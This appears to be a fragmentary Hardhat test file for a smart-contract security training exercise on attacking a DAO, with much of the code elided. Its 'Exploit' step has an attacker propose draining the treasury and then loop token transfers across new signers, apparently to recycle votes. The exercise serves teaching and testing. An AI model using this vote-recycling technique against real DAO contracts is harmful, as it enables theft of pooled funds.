...
describe("DAO Attack Exercise 2", function () {
  ...
  before(async function () {
    ...
    expect(await ethers.provider.getBalance(this.treasury.address)).to.be.equal(
      ETH_IN_TREASURY
    );
  ...
  it("Governance Test", async function () {
    ...
    await expect(
      this.dao.connect(user).propose(user.address, ETH_IN_TREASURY)
    ...
    this.treasuryBalanceAfterFirstProposal = ETH_IN_TREASURY.sub(
      FIRST_PROPOSAL_AMOUNT
    );
    expect(await ethers.provider.getBalance(this.treasury.address)).to.be.equal(
      this.treasuryBalanceAfterFirstProposal
    );
    ...
    await expect(this.dao.execute(2)).to.be.revertedWith(
  ...
  it("Pre-Exploit", async function () {
    ...
    await this.dao
      .connect(attacker)
      .propose(attacker.address, this.treasuryBalanceAfterFirstProposal);
  });
  ...
  it("Exploit", async function () {
    ...
    for (i = 0; i < 350; i++) {
      ...
      await this.dao
        ...
        .transfer(nextSigner.address, ATTACKER_TOKENS);
